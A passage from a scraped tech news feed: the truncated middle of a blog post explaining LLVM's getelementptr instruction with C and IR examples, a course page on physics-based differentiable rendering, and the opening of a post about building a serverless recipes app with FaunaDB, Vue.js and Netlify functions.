its <em>Intermediate Representation</em>, or IR. Having a (well-designed, mature, stable) IR confers
several advantages to an optimizing compiler:</p>

<ul>
  <li>Effective optimization: LLVM’s IR correctly reflects the original program semantics (including
C abstract machine semantics) while providing
<a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">important</a>
<a href="https://en.wikipedia.org/wiki/Basic_block">optimization</a>
<a href="https://llvm.org/docs/LangRef.html#vector-type">primitives</a>. Optimizations happen on the IR itself
through a series of mostly independent transformations (“passes”).</li>
  <li>Rapid language development: programming language authors can target LLVM’s IR instead of native
code, giving them immediate access to
<a href="https://github.com/llvm/llvm-project/tree/master/llvm/lib/Target">all of LLVM’s supported targets</a>
and in-tree optimizations.</li>
  <li>Program analysis: the same properties that make LLVM’s IR amendable to optimization also make it
amenable to program analysis, both static and dynamic. Similarly, the general stability of LLVM’s
IR and APIs has made it the go-to ecosystem for program analysis research.</li>
</ul>

<p>Broadly speaking, LLVM’s IR is divided into four (increasingly narrow) scopes:</p>

<ul>
  <li><a href="https://llvm.org/doxygen/classllvm_1_1Module.html"><em>Modules</em></a>,
corresponding (roughly) to translation units (e.g., a C source file and its headers)</li>
  <li><a href="https://llvm.org/doxygen/classllvm_1_1Function.html"><em>Functions</em></a>,
corresponding to (you guessed it) source functions</li>
  <li><a href="https://llvm.org/doxygen/classllvm_1_1BasicBlock.html"><em>Basic blocks</em></a>,
corresponding to straight-line sections of code connected to each other via
control flow</li>
  <li><a href="https://llvm.org/doxygen/classllvm_1_1Instruction.html"><em>Instructions</em></a>,
corresponding to individual semantics (think add, subtract, load, store, &amp;c)</li>
</ul>

<p>Instructions, in turn, take <a href="https://llvm.org/doxygen/classllvm_1_1Value.html"><em>Values</em></a>.
Functions, basic blocks, and instructions are themselves kinds of values<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>
(among many other kinds), completing the picture.</p>

<p>This blog post concerns a single LLVM instruction: <code>getelementptr</code>.</p>

<h2 id="first-steps">First steps</h2>

<p>Here’s how the
<a href="https://llvm.org/docs/LangRef.html#getelementptr-instruction">LLVM Language Reference</a> defines and
describes <code>getelementptr</code> as of LLVM 10:</p>

<div><div><pre><code>&lt;result&gt; = getelementptr &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;{, [inrange] &lt;ty&gt; &lt;idx&gt;}*
&lt;result&gt; = getelementptr inbounds &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;{, [inrange] &lt;ty&gt; &lt;idx&gt;}*
&lt;result&gt; = getelementptr &lt;ty&gt;, &lt;ptr vector&gt; &lt;ptrval&gt;, [inrange] &lt;vector index type&gt; &lt;idx&gt;
</code></pre></div></div>

<blockquote>
  <p>The ‘<code>getelementptr</code>’ instruction is used to get the address of a subelement of an aggregate data
structure. It performs address calculation only and does not access memory. The instruction can
also be used to calculate a vector of such addresses.</p>
</blockquote>

<p>In other words: it’s a souped up LLVM version of x86’s
<a href="https://c9x.me/x86/html/file_module_x86_id_153.html"><code>lea</code></a>: it computes the effective address of
some field <em>without</em> actually touching any memory. I say “souped up” because it can do a few things
that (a single) <code>lea</code> can’t:</p>

<ul>
  <li>
    <p>A single <code>lea</code>’s ability to compute an indirect address is constrained by
<a href="https://blog.yossarian.net/2020/06/13/How-x86_64-addresses-memory">x86’s addressing modes</a>: if an effective
address into some data structure can’t be computed by the combination of the
<em>scale</em>, <em>index</em>, <em>base</em>, and <em>displacement</em> parameters, then multiple <code>lea</code>s are necessary to get
to the ultimate address. This is <strong>not</strong> true for <code>getelementptr</code>: a single <code>getelementptr</code>
instruction can have as many nested indices as an LLVM frontend is content to generate.</p>
  </li>
  <li>
    <p>Like most LLVM instructions, <code>getelementptr</code> has a “vector” variant: instead of returning a
single computed address, it can return a vector of addresses computed together. Consequently,
for the vectorized variant, some (or even all) of the <code>getelementptr</code>’s index arguments
must be vectors themselves.</p>
  </li>
</ul>

<p>I’ve read this official overview <em>dozens</em> of times, and I <em>basically</em> understand it. Nonetheless,
my eyes still swim whenever I actually <em>read</em> a <code>getelementptr</code> in real IR. LLVM’s developers
are aware of how confusing <code>getelementptr</code> is: they have an
<a href="https://llvm.org/docs/GetElementPtr.html">entire separate page</a> dedicated to explaining its syntax,
why it doesn’t touch memory, and the various constraints on constructing a valid one.</p>

<p>Unfortunately, what that page <em>doesn’t</em> have is a ton of side-by-side examples with real C code.
So that’s what I’m going to do today. All examples will use global variables and
<code>-fno-discard-value-names</code> to make the generated IR a bit easier to read.</p>

<h3 id="basic-addressing">Basic addressing</h3>

<p>Let’s take a look at a trivial C function that just returns the first element in a global array:</p>

<div><div><pre><code><span>long</span> <span>*</span><span>nums</span> <span>=</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>};</span>
<span>long</span> <span>index_first</span><span>(</span><span>void</span><span>)</span> <span>{</span>
    <span>return</span> <span>nums</span><span>[</span><span>0</span><span>];</span>
<span>}</span>
</code></pre></div></div>

<p>and the generated IR (cleaned up a bit):</p>

<div><div><pre><code><span>@nums</span> <span>=</span> <span>dso_local</span> <span>global</span> <span>i64</span><span>*</span> <span>inttoptr</span> <span>(</span><span>i64</span> <span>1</span> <span>to</span> <span>i64</span><span>*),</span> <span>align</span> <span>8</span>

<span>define</span> <span>dso_local</span> <span>i64</span> <span>@index_first</span><span>()</span> <span>#0</span><span>{</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i64</span><span>*,</span> <span>i64</span><span>**</span> <span>@nums</span><span>,</span> <span>align</span> <span>8</span>
  <span>%arrayidx</span> <span>=</span> <span>getelementptr</span> <span>inbounds</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>%0</span><span>,</span> <span>i64</span> <span>0</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>%arrayidx</span><span>,</span> <span>align</span> <span>8</span>
  <span>ret</span> <span>i64</span> <span>%1</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/G6G1xr">Godbolt</a>.)</em></p>

<p>Now, step by step:</p>

<ol>
  <li>We <code>load</code> our global <code>nums</code> into <code>%0</code>, with type <code>i64*</code><sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li>
    <p>We use <code>getelementptr</code> to calculate the address of an <code>i64</code> (the first argument), using:</p>

    <ul>
      <li><code>%0</code> as our base address (the second argument)</li>
      <li><code>0</code> as our index (the third argument)</li>
    </ul>

    <p>…and we store our calculated address into <code>%arrayidx</code>.</p>
  </li>
  <li>We <code>load</code> an <code>i64</code> from our calculated address (<code>%arrayidx</code>) into <code>%1</code></li>
  <li>We <code>ret</code> our loaded value (<code>%1</code>)</li>
</ol>

<p>That’s not too bad at all! <code>getelementptr</code> behaves <em>exactly</em> like the simple index operation that
it models.</p>

<p>What if we change <code>nums</code> to an array? Arrays decompose to pointers in C so it should be the same, right?</p>

<div><div><pre><code><span>long</span> <span>nums</span><span>[]</span> <span>=</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>};</span>
<span>long</span> <span>index_first</span><span>(</span><span>void</span><span>)</span> <span>{</span>
    <span>return</span> <span>nums</span><span>[</span><span>0</span><span>];</span>
<span>}</span>
</code></pre></div></div>

<p>Wrong! LLVM IR isn’t C, and doesn’t play by C’s rules. In particular, it has sized array types that
can be <em>cast</em> to pointers, but that don’t decompose on their own:</p>

<div><div><pre><code><span>@nums</span> <span>=</span> <span>dso_local</span> <span>global</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>1</span><span>,</span> <span>i64</span> <span>2</span><span>,</span> <span>i64</span> <span>3</span><span>],</span> <span>align</span> <span>16</span>

<span>define</span> <span>dso_local</span> <span>i64</span> <span>@index_first</span><span>()</span> <span>#0</span> <span>{</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>getelementptr</span> <span>inbounds</span> <span>([</span><span>3</span> <span>x</span> <span>i64</span><span>],</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]*</span> <span>@nums</span><span>,</span> <span>i64</span> <span>0</span><span>,</span> <span>i64</span> <span>0</span><span>),</span> <span>align</span> <span>16</span>
  <span>ret</span> <span>i64</span> <span>%0</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/eYebqK">Godbolt</a>.)</em></p>

<p>This is simpler in some ways and more complicated in others: <code>getelementptr</code> is now invoked
inline within the <code>load</code><sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>, but we’ve also saved a <code>load</code> and two SSA variables.</p>

<p>Breaking the <code>getelementptr</code> down:</p>

<ul>
  <li>We’re calculating the address of an <code>[3 x i64]</code> (i.e., an array of 3 <code>i64</code>s) (first argument)</li>
  <li><code>nums</code> is our base address, which has type <code>[3 x i64]*</code> (second argument)</li>
</ul>

<p>But wait, there are <strong>two</strong> <code>i64 0</code> indexes instead of just one! What gives?</p>

<p>As best I can tell, this is a quirk of the new type of <code>nums</code>: it’s not a pointer anymore, but an
array. However, because we’re accessing it <em>through</em> a pointer (because that’s how <code>getelementptr</code>
is defined), we actually need two <code>0</code> indexes: the first to piece the pointer, and the second to
index the array itself. Same operation, slightly more indirection within the IR<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<h3 id="more-indirection">More indirection</h3>

<p>What happens when we add a level of source indirection, like an index variable?</p>

<div><div><pre><code><span>long</span> <span>nums</span><span>[]</span> <span>=</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>};</span>
<span>long</span> <span>i</span><span>;</span>
<span>long</span> <span>index_i</span><span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>return</span> <span>nums</span><span>[</span><span>i</span><span>];</span>
<span>}</span>
</code></pre></div></div>

<div><div><pre><code><span>@nums</span> <span>=</span> <span>dso_local</span> <span>global</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>1</span><span>,</span> <span>i64</span> <span>2</span><span>,</span> <span>i64</span> <span>3</span><span>],</span> <span>align</span> <span>16</span>
<span>@i</span> <span>=</span> <span>common</span> <span>dso_local</span> <span>global</span> <span>i64</span> <span>0</span><span>,</span> <span>align</span> <span>8</span>

<span>define</span> <span>dso_local</span> <span>i64</span> <span>@index_i</span><span>()</span> <span>#0</span> <span>{</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>@i</span><span>,</span> <span>align</span> <span>8</span>
  <span>%arrayidx</span> <span>=</span> <span>getelementptr</span> <span>inbounds</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>],</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]*</span> <span>@nums</span><span>,</span> <span>i64</span> <span>0</span><span>,</span> <span>i64</span> <span>%0</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>%arrayidx</span><span>,</span> <span>align</span> <span>8</span>
  <span>ret</span> <span>i64</span> <span>%1</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/MvMj5o">Godbolt</a>.)</em></p>

<p>It’s nearly identical to our second trivial example! The only thing that’s changed is our
last index, going from <code>0</code> to <code>%0</code> (which corresponds to our loaded <code>i</code>). This in
turn confirms what we thought about the two <code>i64 0</code>s above: that the first (still present)
simply pierces the pointer, while the second performs the “actual” indexing.</p>

<p>Let’s try it with more <del>flavor</del> dimensionality:</p>

<div><div><pre><code><span>long</span> <span>nums</span><span>[</span><span>3</span><span>][</span><span>3</span><span>]</span> <span>=</span> <span>{</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>},</span> <span>{</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>},</span> <span>{</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>}</span> <span>};</span>
<span>long</span> <span>i</span><span>;</span>
<span>long</span> <span>index_i2</span><span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>return</span> <span>nums</span><span>[</span><span>i</span><span>][</span><span>i</span><span>];</span>
<span>}</span>
</code></pre></div></div>

<p>yields:</p>

<div><div><pre><code><span>@nums</span> <span>=</span> <span>dso_local</span> <span>local_unnamed_addr</span> <span>global</span> <span>[</span><span>3</span> <span>x</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]]</span> <span>[[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>1</span><span>,</span> <span>i64</span> <span>2</span><span>,</span> <span>i64</span> <span>3</span><span>],</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>2</span><span>,</span> <span>i64</span> <span>3</span><span>,</span> <span>i64</span> <span>4</span><span>],</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>3</span><span>,</span> <span>i64</span> <span>4</span><span>,</span> <span>i64</span> <span>5</span><span>]],</span> <span>align</span> <span>16</span>
<span>@i</span> <span>=</span> <span>common</span> <span>dso_local</span> <span>local_unnamed_addr</span> <span>global</span> <span>i64</span> <span>0</span><span>,</span> <span>align</span> <span>8</span>

<span>define</span> <span>dso_local</span> <span>i64</span> <span>@index_i2</span><span>()</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>@i</span><span>,</span> <span>align</span> <span>8</span>
  <span>%arrayidx1</span> <span>=</span> <span>getelementptr</span> <span>inbounds</span> <span>[</span><span>3</span> <span>x</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]],</span> <span>[</span><span>3</span> <span>x</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]]*</span> <span>@nums</span><span>,</span> <span>i64</span> <span>0</span><span>,</span> <span>i64</span> <span>%0</span><span>,</span> <span>i64</span> <span>%0</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>%arrayidx1</span><span>,</span> <span>align</span> <span>8</span>
  <span>ret</span> <span>i64</span> <span>%1</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6rshW3">Godbolt</a>.)</em></p>

<p>Exactly as expected: all we’re doing is indexing one layer deeper into the aggregate with the same
index (<code>%0</code>) and, sure, enough, our <code>getelementptr</code> has one additional argument.</p>

<p>Adding a little bit of math makes it clear that the order of the indexes is as we expect:</p>

<div><div><pre><code><span>long</span> <span>nums</span><span>[</span><span>3</span><span>][</span><span>3</span><span>]</span> <span>=</span> <span>{</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>},</span> <span>{</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>},</span> <span>{</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>}</span> <span>};</span>
<span>long</span> <span>i</span><span>;</span>
<span>long</span> <span>index_i2</span><span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>return</span> <span>nums</span><span>[</span><span>i</span><span>][</span><span>i</span> <span>+</span> <span>1</span><span>];</span>
<span>}</span>
</code></pre></div></div>

<p>becomes:</p>

<div><div><pre><code><span>@nums</span> <span>=</span> <span>dso_local</span> <span>local_unnamed_addr</span> <span>global</span> <span>[</span><span>3</span> <span>x</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]]</span> <span>[[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>1</span><span>,</span> <span>i64</span> <span>2</span><span>,</span> <span>i64</span> <span>3</span><span>],</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>2</span><span>,</span> <span>i64</span> <span>3</span><span>,</span> <span>i64</span> <span>4</span><span>],</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]</span> <span>[</span><span>i64</span> <span>3</span><span>,</span> <span>i64</span> <span>4</span><span>,</span> <span>i64</span> <span>5</span><span>]],</span> <span>align</span> <span>16</span>
<span>@i</span> <span>=</span> <span>common</span> <span>dso_local</span> <span>local_unnamed_addr</span> <span>global</span> <span>i64</span> <span>0</span><span>,</span> <span>align</span> <span>8</span>

<span>define</span> <span>dso_local</span> <span>i64</span> <span>@index_i2</span><span>()</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>@i</span><span>,</span> <span>align</span> <span>8</span>
  <span>%add</span> <span>=</span> <span>add</span> <span>nsw</span> <span>i64</span> <span>%0</span><span>,</span> <span>1</span>
  <span>%arrayidx1</span> <span>=</span> <span>getelementptr</span> <span>inbounds</span> <span>[</span><span>3</span> <span>x</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]],</span> <span>[</span><span>3</span> <span>x</span> <span>[</span><span>3</span> <span>x</span> <span>i64</span><span>]]*</span> <span>@nums</span><span>,</span> <span>i64</span> <span>0</span><span>,</span> <span>i64</span> <span>%0</span><span>,</span> <span>i64</span> <span>%add</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>%arrayidx1</span><span>,</span> <span>align</span> <span>8</span>
  <span>ret</span> <span>i64</span> <span>%1</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/c85rsx">Godbolt</a>.)</em></p>

<p><code>%add</code> boils down to <code>i + 1</code>, as expected.</p>

<h3 id="structures-and-other-composites">Structures and other composites</h3>

<p>We’ve been doing pointers and arrays so far, but <code>getelementptr</code> is well defined for <em>any</em>
<a href="https://llvm.org/docs/LangRef.html#t-aggregate">aggregate</a>, including structures.</p>

<p>Let’s go all in:</p>

<div><div><pre><code><span>typedef</span> <span>struct</span> <span>foo</span> <span>{</span>
  <span>struct</span> <span>{</span>
    <span>long</span> <span>field1</span><span>;</span>
    <span>struct</span> <span>{</span>
      <span>long</span> <span>field2</span><span>;</span>
      <span>long</span> <span>field3</span><span>;</span>
      <span>union</span> <span>{</span>
        <span>long</span> <span>field4</span><span>;</span>
        <span>char</span> <span>field5</span><span>[</span><span>32</span><span>];</span>
      <span>}</span> <span>quux</span><span>;</span>
      <span>long</span> <span>field6</span><span>;</span>
      <span>long</span> <span>fiel…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example</a></em></p>]]>
            </description>
            <link>https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528033</guid>
            <pubDate>Sat, 19 Sep 2020 15:25:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Physics-Based Differentiable Rendering a Comprehensive Introduction]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24527870">thread link</a>) | @adamnemecek
<br/>
September 19, 2020 | https://shuangz.com/courses/pbdr-course-sg20/? | <a href="https://web.archive.org/web/*/https://shuangz.com/courses/pbdr-course-sg20/?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><img alt="teaser" src="https://shuangz.com/courses/pbdr-course-sg20/pbdr_teaser.png">

</p>
<p><span>Abstract</span></p>
<p>
Physics-based rendering algorithms generate photorealistic images by simulating the flow of light through a detailed mathematical representation of a virtual scene. In contrast, <b>physics-based differentiable rendering</b> algorithms focus on computing derivative of images exhibiting complex light transport effects (e.g., soft shadows, interreflection, and caustics) with respect to arbitrary scene parameters such as camera pose, object geometry (e.g., vertex positions) as well as spatially varying material properties expressed as 2D textures and 3D volumes. This new level of generality has made physics-based differentiable rendering a key ingredient for solving many challenging inverse-rendering problems, that is, the search of scene configurations optimizing user-specified objective functions, using gradient-based methods
</p>
<p>
Further, these techniques can be incorporated into probabilistic inference and machine learning pipelines. For instance, differentiable renderers allow "rendering losses" to be computed with complex light transport effects captured. Additionally, they can be used as generative models that synthesize photorealistic images.
</p>
<p>
<u><b>Challenges.</b></u> Compared to its "ordinary" counterpart, physics-based differentiable rendering introduces unique theoretical and practical challenges. For instance, practical problems can involve many (e.g., 10<sup>6</sup>--10<sup>10</sup>) parameters, making simple techniques for differentiation such as finite differences impractical. More advanced tools for automatic differentiation (e.g., <tt>PyTorch</tt> or <tt>Tensorflow</tt>) record a graph of intermediate computation steps that tends to become prohibitively large. Lastly, geometric derivatives involve a unique challenge: boundaries of objects introduce troublesome discontinuities during the computation of shadows and interreflections that lead to incorrect gradients if precautions are not taken. Thankfully, recent advances in physics-based differentiable rendering theory have enabled the differentiation of radiometric measurements with respect to arbitrary scene parameters as well as unbiased Monte Carlo estimators. <b>In this course, we provide an in-depth introduction to general-purpose physics-based differentiable rendering.</b>
</p>
<p><span>Course Recording</span></p>
<iframe src="https://player.vimeo.com/video/455558682" width="920" height="518" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
<p><span>Resources</span></p>
<ul>
<li>
<b>Slides:</b> <a href="https://shuangz.com/courses/pbdr-course-sg20/downloads/pbdr-course-sg20-slides.key">key</a> (548 MB), <a href="https://shuangz.com/courses/pbdr-course-sg20/downloads/pbdr-course-sg20-slides.pdf">pdf</a> (122 MB)
</li>
<li>
<b>Course notes:</b> <a href="https://shuangz.com/courses/pbdr-course-sg20/downloads/pbdr-course-sg20-notes.pdf">pdf</a> (9 MB, work in progress)
</li>
<li>
<b>Demo code:</b> <a href="https://github.com/BachiLi/diffrender_tutorials">github</a>
</li>
</ul>
</div><p>
© 2020. All Rights Reserved.
</p></div>]]>
            </description>
            <link>https://shuangz.com/courses/pbdr-course-sg20/?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24527870</guid>
            <pubDate>Sat, 19 Sep 2020 15:05:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I built a serverless recipes app with FaunaDB and Vue.js – ttntm.me]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24527105">thread link</a>) | @kiyanwang
<br/>
September 19, 2020 | https://ttntm.me/blog/serverless-recipes-app-faunadb-vuejs/ | <a href="https://web.archive.org/web/*/https://ttntm.me/blog/serverless-recipes-app-faunadb-vuejs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2><p>I had already heard of
<a href="https://fauna.com/client-serverless" title="client-serverless architecture" target="_blank" rel="noopener">client-serverless architecture</a> and read a bunch of articles about the subject when I came up with the idea of creating a
<a href="https://recept0r.com/" title="personal use recipes app" target="_blank" rel="noopener">personal use recipes app</a> earlier this year - I hadn’t done anything like that before though.</p><p><img src="https://ttntm.me/img/blog/client-serverless-credit-faunadb.png" alt="client-serverless application model"></p><p>What I had in mind at this point was a minimal web application that would serve me and my wife as a recipes collection for food that we enjoy cooking. Convenient bonus features like PWA functionality (i.e. using the app on the phone or tablet when standing in the kitchen) and user authentication should be available too, making sure it’s not just functional, but also enjoyable to use.</p><p>At first, I was tempted to go for a static site + headless CMS approach that worked really well for many other projects I did - it could be considered serverless, but it wouldn’t have been a challenge, nor anything I hadn’t done before; and that’s precisely the reason I went looking for something else, eventually going for Vue.js + FaunaDB for this project.</p><h3 id="why-fauna">Why Fauna?</h3><p>The first time I came across
<a href="https://dashboard.fauna.com/accounts/register?utm_source=DevTo&amp;utm_medium=referral&amp;utm_campaign=WritewithFauna_ServerlessRecipes_TDoe" title="FaunaDB" target="_blank" rel="noopener">FaunaDB</a> was when I was looking for SQL alternatives for a project at work last year. We didn’t go for it (PostgreSQL was chosen in the end), but I kept it in mind for the future. Back then, it may have sounded a little “too good to be true” for the majority of the decision makers involved, but marketing statements like “add a global datastore to your app in minutes” and “don’t worry about database correctness, sharding, provisioning, latency, or scale” left me with an overall positive impression of their service.</p><p>So, when I had to pick a database for my recipes app, I found myself looking at FaunaDB’s website again, checking out their
<a href="https://dashboard.fauna.com/accounts/register?utm_source=DevTo&amp;utm_medium=referral&amp;utm_campaign=WritewithFauna_ServerlessRecipes_TDoe" title="pricing model" target="_blank" rel="noopener">pricing model</a> this time. The “Always Free” plan seemed generous enough to support a small personal use app, so I didn’t hesitate much and signed up right away.</p><p>To be honest, I didn’t really bother looking for alternatives too much - self hosted databases or things like AWS/Azure/Firebase were not quite what I had in mind.</p><h2 id="basic-app-functionality">Basic App Functionality</h2><p>The recipes app I built can be described as a basic CRUD (create-read-update-delete) application - there’s no intense computing or sophisticated algorithms. The recipes are available in read-only mode to the public, whereas creating, editing and deleting them requires an authenticated user (i.e. the author). Other than that, there are smaller convenience features like search, filtering and a dedicated page to see your own recipes.</p><h3 id="vue-app-setup">Vue App Setup</h3><p>Vue.js was on my list of “frameworks I’d like to work with” for a while, so the decision of going for it was a rather easy one. If you’re looking for some good reasons in favor of using Vue in general, some of them can be found here:
<a href="https://michaelnthiessen.com/underdog-framework" title="michaelnthiessen.com/underdog-framework" target="_blank" rel="noopener">michaelnthiessen.com/underdog-framework</a></p><p>What I ended up building can be described as a classic SPA with multiple routes (i.e. pages) for different functions. For anonymous users, it loads a page of recipe cards that can be searched and an “About” page. Each recipe card can be clicked, which opens its respective details page containing the actual cooking instructions and a nice image. There’s a login button that can be used to both sign up and sign in - public signup is currently disabled though, as this is an invite only service at the moment.</p><p>Once logged in, registered users get 2 additional routes: “Create” and “My Recipes”. As the respective title suggests, these pages can be used to either create additional recipes or to view a sortable list of the current user’s recipes. Editing and deleting recipes is a part of each recipe’s details page when logged in as the recipe’s author.</p><p>Each of the app’s individual routes=pages was implemented as its own Vue
<a href="https://vuejs.org/v2/guide/single-file-components.html" title="SFC" target="_blank" rel="noopener">SFC</a> file, shared functionality (i.e. navbar, toast messages, etc.) makes use of reusable components. To tie it all together, Vue extensions like <code>vue-router</code> and <code>vuex</code> were used to manage rounting and application state more efficiently - you’re welcome to browse the full list of dependencies
<a href="https://github.com/ttntm/recept0r/blob/master/package.json" title="on GitHub" target="_blank" rel="noopener">on GitHub</a> if you’re interested in what other packages I used.</p><h3 id="faunadb-setup">FaunaDB Setup</h3><p>Setting up a database in FaunaDB is surprisingly easy - log in to your account, create a database and finally create a collection for your data (i.e. recipes). Their
<a href="https://docs.fauna.com/fauna/current/start/cloud" title="documentation" target="_blank" rel="noopener">documentation</a> regarding “getting started” is quite good and there’s also an interactive tutorial that provides a practical introduction once you signed up.</p><p>As FaunaDB is schema-less and close to zero-config, the structure of my app’s data organically grew from its needs. An example can probably help to clarify what I mean here: initially, I didn’t really think much about where to store the images for the recipes. FaunaDB is technically able to store Base64 encoded images inside the recipe objects, so I went for that approach initially. As images tend to be large though, this inflated my database, added a lot of bandwidth consumption and crippled loading times on top of that - I can assure you that it’s not a good idea (also
<a href="https://docs.fauna.com/fauna/current/api/fql/documents#limits" title="not recommended" target="_blank" rel="noopener">not recommended</a> by FaunaDB themselves).</p><p>That’s not the point though - my app wrote the Base64 images into the database without any specific configuration and later <a href="https://ttntm.me/blog/how-to-use-cloudinary-with-vue-app/">replaced them with links to the actual images</a> just like that as well. FaunaDB simply adjusts to the data you provide, even if not all data inside a collection has the same set of properties (i.e. some recipes with picture, others without).</p><p><strong>To sum it up</strong>: as far as my rather simple application is concerned, FaunaDB was quick and easy to set up and configure, no matter what data I provided or how I ended up transforming and manipulating it.</p><h2 id="serverless-functionality">Serverless Functionality</h2><p>It would have been possible to implement the necessary database operations directly in the Vue app (see
<a href="https://docs.fauna.com/fauna/current/drivers/javascript.html" title="Fauna's JS driver" target="_blank" rel="noopener">Fauna's JS driver</a>, but that would have been a severe security concern. I decided to add a 3rd layer here, forcing database operations to go through Netlify functions. These serverless functions provide a clear separation of concerns and added security for the database access token.</p><p>But what are Netlify functions?</p><p>Here’s an explanatory paragraph from
<a href="https://functions.netlify.com/" title="their website" target="_blank" rel="noopener">their website</a>:</p><blockquote><p>Functions are scripts that you write and deploy with Netlify. The function’s code is hidden from the public, but you can interact with it just like any other API service.</p></blockquote><p>For my app, I am using a couple of these functions for what would otherwise have to be backend or server-side functionality - more specifically for all database operations and user identity management (via
<a href="https://docs.netlify.com/visitor-access/identity" title="Netlify Identity" target="_blank" rel="noopener">Netlify Identity</a>).</p><h3 id="local-development-configuration">Local Development Configuration</h3><p>It was my first time using Netlify functions and as such, I based my choice of Node modules and configuration on seemingly outdated information; my functions returned errors instead of data…</p><p>After some hours of less successful trial and error cycles, I stumbled upon this article recommending the&nbsp;<code>netlify-cli</code> module:&nbsp;
<a href="https://alligator.io/nodejs/solve-cors-once-and-for-all-netlify-dev" title="Solve CORS once and for all with Netlify Dev" target="_blank" rel="noopener">Solve CORS once and for all with Netlify Dev</a></p><p>So, if you’re going to use Netlify functions, this is as good as it gets - really simple configuration and immediate success. Just keep in mind or bookmark&nbsp;<code>localhost:8888</code> - your terminal output (based on Vue CLI and Webpack) will continue to direct you to port 8080 instead where functions don’t work and none of the success is visible.</p><h3 id="user-authentication">User Authentication</h3><p>The user signup and login procedures I used for my app are based on a library called
<a href="https://github.com/netlify/gotrue-js" title="gotrue-js" target="_blank" rel="noopener">gotrue-js</a> that in itself “is a client library for the
